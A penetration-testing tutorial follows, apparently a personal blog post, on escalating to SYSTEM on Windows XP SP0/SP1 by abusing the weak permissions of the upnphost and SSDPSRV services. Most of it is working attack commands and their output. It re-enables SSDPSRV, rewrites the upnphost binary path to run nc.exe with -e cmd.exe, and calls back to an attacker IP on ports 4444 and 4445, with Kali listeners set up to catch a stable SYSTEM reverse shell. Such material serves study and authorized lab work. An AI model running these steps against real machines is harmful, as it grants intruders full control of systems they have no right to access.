---
description: >-
  Abusing upnphost and its SSDPSRV dependency
title: upnphost and SSDPSRV             # Add title here
date: 2022-11-21 08:00:00 -0600                           # Change the date to match completion date
categories: [04 Privilege Escalation, Windows - upnphost and SSDPSRV]                     # Change Templates to Writeup
tags: [windows privesc, upnphost, windows XP, vulnerable microsoft services]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

This article assumes that you have already obtained a low privilege shell on your victim's computer. You have enumerated this machine and concluded that the operating system is Windows XP with SP0 or SP1 installed.

If you meet the requirements above, we can continue! This method of privilege escalation relies on vulnerable Microsoft Services. Most services in newer Windows versions (starting from Windows XP SP2) are no longer vulnerable. Vulnerable in this case, means that we can edit the services' parameters.

##### Check for vulnerability

In order to check if we have any vulnerable service(s) on our system, we need to download [accesschk.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from [SysInternals](http://live.sysinternals.com/), and transfer it to our victim's machine via the low privilege shell we have already established.

> Any binary you transfer via FTP requires you to set your FTP session to binary. You can do this by typing 'binary' in your FTP session.
{: .prompt-tip }

```bash
ftp> binary 
200 Type set to I. 
```
 
> When accesschk.exe is uploaded and we execute the latest version of accesschk.exe from SysInternals, we won't be able to execute this in our low level shell. Why you ask? Well, when you run accesschk.exe for the first time in a GUI environment, it will give you a pop up window asking you to accept their EULA. If we run accesschk.exe via CLI it would freeze our shell. Wouldn't they build in some kind of parameter in the accesschk.exe binary to accept the EULA via CLI? Yes, they actually did. In older versions of accesschk.exe there was a parameter /accepteula which did exactly that, but they removed the parameter in newer releases. That being said, we will have to download an older version of accesschk.exe to fulfill our needs.
{: .prompt-warning }

You can download older versions with the /accepteula parameter from [here](https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip%0D) and [here](https://xor.cat/assets/other/Accesschk.zip)
With that issue out of the way, let's continue. Once you have uploaded the older version of accesschk.exe to your victim, we can use it to look for vulnerable services we can exploit. We can do this with the following query:

```powershell
C:\> accesschk.exe /accepteula -uwcqv "Authenticated Users" * 

# If we are on a Windows XP SP0 or SP1 OS we will receive the following output 

RW SSDPSRV
	SERVICE_ALL_ACCESS
RW upnphost
	SERVICE_ALL_ACCESS
```

The output implies that we have access to two services from which we can edit the service parameters, named upnphost and SSDPSRV. Let's take a closer look at both services.

```powershell
SSDPSRV C:\> accesschk.exe /accepteula -ucqv SSDPSRV 
SSDPSRV
	RW NT AUTHORITY\SYSTEM 
		SERVICE_ALL_ACCESS 
	RW BUILTIN\Administrators 
		SERVICE_ALL_ACCESS 
	RW NT AUTHORITY\Authenticated Users 
		SERVICE_ALL_ACCESS 
	RW BUILTIN\Power Users 
		SERVICE_ALL_ACCESS 
	RW NT AUTHORITY\LOCAL SERVICE 
		SERVICE_ALL_ACCESS

# upnphost

C:\> accesschk.exe /accepteula -ucqv upnphost 
upnphost 
	RW NT AUTHORITY\SYSTEM 
		SERVICE_ALL_ACCESS 
	RW BUILTIN\Administrators 
		SERVICE_ALL_ACCESS 
	RW NT AUTHORITY\Authenticated Users 
		SERVICE_ALL_ACCESS 
	RW BUILTIN\Power Users 
		SERVICE_ALL_ACCESS 
	RW NT AUTHORITY\LOCAL SERVICE 
		SERVICE_ALL_ACCESS
```

When we edit these services so they execute a binary of our choice, we can escalate our privileges to SYSTEM.

##### How to exploit it?

Before we exploit these services, let's check out how their parameters look at the moment.

```powershell
# upnphost 

C:\> sc qc upnphost 
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: upnphost
	TYPE : 20 WIN32_SHARE_PROCESS
	START_TYPE : 3 DEMAND_START
	 ERROR_CONTROL : 1 NORMAL
	 BINARY_PATH_NAME : C:\WINDOWS\System32\svchost.exe -k LocalService
	 LOAD_ORDER_GROUP :
	 TAG : 0
	 DISPLAY_NAME : Universal Plug and Play Device Host
	 DEPENDENCIES : SSDPSRV
	 SERVICE_START_NAME : NT AUTHORITY\LocalService 
# SSDPSRV 
C:\> sc qc SSDPSRV 
[SC] GetServiceConfig SUCCESS 
SERVICE_NAME: SSDPSRV 
	TYPE : 20 WIN32_SHARE_PROCESS
	START_TYPE : 4 DISABLED
	ERROR_CONTROL : 1
	NORMAL BINARY_PATH_NAME : C:\WINDOWS\System32\svchost.exe -k LocalService
	LOAD_ORDER_GROUP :
	TAG : 0
	DISPLAY_NAME : SSDP Discovery Service
	DEPENDENCIES :
	SERVICE_START_NAME : NT AUTHORITY\LocalService
```

upnphost is the service we are going to use to escalate our privileges. As you can see upnphost has a dependency, it requires SSDPSRV to run as well. If we take a look at the current status of SSDPSRV with the command `sc query SSDPSRV` we can see that the service is currently STOPPED. If we try to start this service, we will get an error, as shown below.

```powershell
Query status

C:\> sc query SSDPSRV

SERVICE_NAME: SSDPSRV
	TYPE : 20 WIN32_SHARE_PROCESS
	STATE : 1 STOPPED
			(NOT_STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)
	WIN32_EXIT_CODE : 1077 (0x435)
	SERVICE_EXIT_CODE : 0 (0x0)
	CHECKPOINT : 0x0
	WAIT_HINT : 0x0
# Attempt to start the service

C:\> net start SSDPSRV
System error 1058 has occurred.

The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.
```

In order to fix this, we will need to set the SSDPSRV from DISABLED to AUTOMATIC. Once the service is set to AUTOMATIC we will be able to start it. We can do this with the following commands.

```powershell
Set SSDPSRV to AUTOMATIC
# NOTE: There is a space between = and auto. This is important, else the command will fail.

C:\> sc config SSDPSRV start= auto
[SC] ChangeServiceConfig SUCCESS

# Double check if it's set to AUTOMATIC (or AUTO_START)

C:\> sc qc SSDPSRV
[SC] GetServiceConfig SUCCESS
SERVICE_NAME: SSDPSRV
	TYPE : 20 WIN32_SHARE_PROCESS
	START_TYPE : 2 AUTO_START
	ERROR_CONTROL : 1
	NORMAL BINARY_PATH_NAME : C:\WINDOWS\System32\svchost.exe -k LocalService
	LOAD_ORDER_GROUP :
	TAG : 0
	DISPLAY_NAME : SSDP Discovery Service
	DEPENDENCIES :
	SERVICE_START_NAME : NT AUTHORITY\LocalService
```

SSDPSRV is successfully set to AUTOMATIC (AUTO_START)! Now let's try to start SSDPSRV again.

```powershell
C:\> net start SSDPSRV
The SSDP Discovery Service service is starting.
The SSDP Discovery Service service was started successfully.
```

Awesome! We now have our dependency running to start the upnphost service. If we run upnphost now though, it won't do much good for us. We first need to edit its parameters so the service will execute a binary of our choice. There are multiple ways to approach this. One option is to generate our own binary with msfvenom, but that's out of scope for this article. What we will do is upload the netcat binary (nc.exe) to our victim. Again, don't forget to put your FTP session in binary, or you won't be able to execute the executable via CLI.

You can download the Windows executables (32bit and 64bit) from Netcat [here](https://eternallybored.org/misc/netcat/).

Once nc.exe is uploaded to your victim, take note of its current path, because we will need it now we are going to edit the parameters from the upnphost service. Execute the commands below to edit the path of the binary that the upnphost service will execute when it's started.

```powershell
# Set new binary path (don't forget the space after binpath=)
# Syntax
C:\> sc config upnphost binpath= "C:\nc.exe -nv [ip] [port] -e C:\WINDOWS\System32\cmd.exe"

# Example
C:\> sc config upnphost binpath= "C:\nc.exe -nv 192.168.0.2 4444 -e C:\WINDOWS\System32\cmd.exe"
[SC] ChangeServiceConfig SUCCESS

# Set obj and password 
C:\> sc config upnphost obj= ".\LocalSystem" password= ""
[SC] ChangeServiceConfig SUCCESS
```

Our upnphost service should now be ready to execute our nc.exe binary and connect back to a listener we will set up on our attacking machine. Let's do one last check of our upnphost service and make sure everything is as it should be.

```powershell
C:\> sc qc upnphost
[SC] GetServiceConfig

SUCCESS SERVICE_NAME: upnphost
	TYPE : 20 WIN32_SHARE_PROCESS
	START_TYPE : 3 DEMAND_START
	ERROR_CONTROL : 1 NORMAL
	BINARY_PATH_NAME : C:\nc.exe -nv 192.168.0.2 4444 -e C:\WINDOWS\System32\cmd.exe
	LOAD_ORDER_GROUP :
	TAG : 0
	DISPLAY_NAME : Universal Plug and Play Device Host
	DEPENDENCIES : SSDPSRV
	SERVICE_START_NAME : NT AUTHORITY\LocalService
```  

Looks perfect! The next thing to do is set up a simple listener on our attacking machine. I prefer to use Netcat for this.

```bash
root@kali> nc -lvnp 4444
```

We are now ready to start the upnphost service and execute our reverse shell via the new binary path we provided.

```powershell
C:\> net start upnphost
```

We have now received a SYSTEM shell on our listener at our attacking machine! But there's another problem. The shell is unstable and it closes after about 30 seconds. Luckily there is a way to solve this. Once we get the unstable shell on port 4444, we will execute another command right away that will establish a 2nd connection to another listener we set up on another port. When the unstable shell is closed, set up your listener again at port 4444 and set up a 2nd listener in another tab on another port. I will set my 2nd listener at port 4445.

```bash
# TAB 1
root@kali> nc -lvnp 4444  
# TAB 2
root@kali> nc -lvnp 4445
```

Next, prepare a payload to send once our connection to the first listener on port 4444 is established. We can simply copy the payload we added in the binary path from our upnphost service, and change the port to the port of our 2nd listener.

```powershell
C:\nc.exe -nv 192.168.0.2 4445 -e C:\WINDOWS\System32\cmd.exe
```

Finally we're ready to get a steady SYSTEM shell. Start the upnphost service again, a new connection will be established to our listener on port 4444. Once this shell is open, paste your payload we just created for a new connection to our listener on port 4445 and execute it. When we now check our listener in TAB 2, we will have a steady SYSTEM shell that will not close after a while.

[Credits to sohvaxus](https://sohvaxus.github.io/content/winxp-sp1-privesc.html)
